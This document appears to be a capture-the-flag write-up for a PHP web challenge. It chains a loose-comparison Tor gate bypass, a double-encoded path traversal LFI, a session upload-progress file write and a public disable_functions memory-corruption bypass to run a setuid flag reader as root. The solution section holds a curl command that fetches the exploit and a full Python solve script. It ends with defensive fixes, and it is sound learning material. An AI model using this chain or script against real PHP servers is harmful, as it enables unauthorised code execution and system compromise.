Four PHP footguns stacked into one chain. A "Ransomware-as-a-Service" site that swears it only talks to Tor lets everyone in, hands you a [file inclusion](https://cwe.mitre.org/data/definitions/98.html) you can only reach by encoding your slashes twice, lets you write PHP into `/tmp` through a *progress bar* feature, and then — with every command function disabled — still ends with a root shell reading the flag.

## Overview

Mr. Burns is a Medium **Web** challenge shipped whitebox (full PHP source + Dockerfile). The flag lives in `/root/flag`, readable only by a `setuid-root` helper `/readflag`, and PHP has `disable_functions` set to every exec primitive (`system`, `exec`, `popen`, `proc_open`, `shell_exec`, `passthru`, …). The path: bypass the Tor gate → local file inclusion → write a payload into a PHP session file via `session.upload_progress` → include it to run an mm0r1 `disable_functions` bypass → execute `/readflag` as root.

## The technique

### 1. A Tor gate that admits everyone

```php
$_SESSION['isTor'] = strpos(file_get_contents('.../torbulkexitlist'), $_SERVER['REMOTE_ADDR']) == 0;
```

`strpos()` returns the *offset* of the needle, or the boolean `false` when it isn't found. A normal visitor's IP is not a Tor exit node, so `strpos` returns `false` — and in PHP [`false == 0` is `true`](https://cwe.mitre.org/data/definitions/697.html) (loose comparison coerces both to `0`). The "is this a Tor node?" test therefore passes for every non-Tor address. Nothing to send; the gate is already open. (Never loose-compare `strpos` — use `=== false` or `str_contains()`.)

### 2. LFI reachable only by double-encoding

```php
$router->new('GET', '/miner/{param}', 'MinerController@show');
// ...
include("./miners/${miner_id}");
```

Classic [file inclusion](https://cwe.mitre.org/data/definitions/98.html), constrained by `open_basedir=/www:/tmp`. But the router has a decode-ordering bug:

- `_match_route()` splits the **raw** `REQUEST_URI` — so `%2f` keeps the path as a single segment and the route matches.
- `getRouteParameters()` runs `urldecode()` *before* splitting, then `urldecode()`s the captured segment **again**.

A single `%2f` becomes a real `/` too early and the `{param}` capture collapses to just `..`. The fix is [double URL-encoding the slashes](https://cwe.mitre.org/data/definitions/22.html): `%252f` survives the first decode (still one segment, route still matches) and the second `urldecode` turns it into `/`:

```
GET /miner/..%252f..%252ftmp%252f<file>   ->  include("/tmp/<file>")
```

### 3. Writing PHP into /tmp with session.upload_progress

We can include a `/tmp` file — but there is no upload form. PHP's upload-progress feature provides the write: with `session.upload_progress.enabled=On` and `cleanup=Off` (both defaults), a multipart POST carrying a field named `PHP_SESSION_UPLOAD_PROGRESS` plus a `PHPSESSID` cookie makes PHP write that field's value into `/tmp/sess_<id>` — at the SAPI level, *before* the target script runs, and it **persists** after the upload (no race).

Two gotchas that cost real debugging time:

- **The session id must be valid.** `session.sid_bits_per_character=4` → the id charset is hex `[0-9a-f]`, length 32. Use 32 hex characters (`"a"*32`). A non-hex id is silently discarded and the file is never created.
- The POST target (`/`) is GET-only and returns **405** — irrelevant. The upload-progress write already happened during body parsing.

### 4. Bypassing disable_functions to run /readflag

Every PHP command function is disabled, but `/readflag` is `setuid root`. The payload we plant is **mm0r1's `php7-backtrace-bypass`** ([CVE-worthy PHP bug #76047](https://bugs.php.net/bug.php?id=76047) — a `debug_backtrace()` [use-after-free](https://cwe.mitre.org/data/definitions/416.html) affecting PHP 7.0–7.4). It walks PHP's own memory to find the internal `system` handler and calls it as *native* code, which `disable_functions` — a PHP-layer blocklist — cannot stop. Command: `/readflag` → runs as root → prints the flag.

## Solution

`bypass.php` is mm0r1's exploit with the command set to the flag reader:

```sh
curl -s https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php -o bypass.php
sed -i 's/pwn("uname -a");/pwn("echo _FLAGSTART_; \/readflag; echo _FLAGEND_");/' bypass.php
```

`solve.py` — two requests: plant the payload into the session file, then include it:

```python
import sys, requests, re
IP, PORT = sys.argv[1], sys.argv[2]
B = f"http://{IP}:{PORT}"
SID = "a"*32                       # valid 32-char hex sid (sid_bits_per_character=4)
payload = open("bypass.php","rb").read()
bd = "----burns"

# 1) session.upload_progress writes our PHP into /tmp/sess_<SID> (cleanup=Off -> persists)
body  = f"--{bd}\r\n".encode()
body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'+payload+b"\r\n"
body += f"--{bd}\r\n".encode()
body += b'Content-Disposition: form-data; name="file"; filename="x"\r\nContent-Type: text/plain\r\n\r\n'+b"A"*4096+b"\r\n"
body += f"--{bd}--\r\n".encode()
requests.post(B+"/", data=body,
    headers={"Content-Type":f"multipart/form-data; boundary={bd}"},
    cookies={"PHPSESSID":SID}, timeout=30)

# 2) double-encoded traversal LFI includes the session file -> runs the bypass -> root reads the flag
r = requests.get(B+f"/miner/..%252f..%252ftmp%252fsess_{SID}", cookies={"PHPSESSID":SID}, timeout=30)
m = re.search(r"_FLAGSTART_(.*?)_FLAGEND_", r.text, re.S)
print("flag:", m.group(1).strip() if m else "not found")
```

```
$ python3 solve.py <ip> <port>
flag: HTB{...}
```

## Why it worked

Every link is a PHP default gone wrong: `==` coercing `false` to `0`, a router decoding user input more times than it validates it, an upload-progress feature that writes attacker-controlled bytes to a predictable file, and a "security" setting (`disable_functions`) that only blocks the PHP layer while a memory-corruption bug reaches the native function underneath. None of it required a single custom binary or a race window.

## Fix / defense

- **Tor check:** never loose-compare `strpos()`; use `str_contains()` / `str_starts_with()`.
- **LFI:** never concatenate user input into `include()`; allow-list the miner id and canonicalize/reject `..`.
- **Session write:** set `session.upload_progress.cleanup=On`, keep session files out of any directory the include sink can reach, and don't expose `phpinfo()`.
- **disable_functions is defense-in-depth, not a boundary.** The real bug is a web-reachable `setuid` flag reader — isolate it (separate uid, no web-triggerable exec) rather than relying on a PHP-layer blocklist.
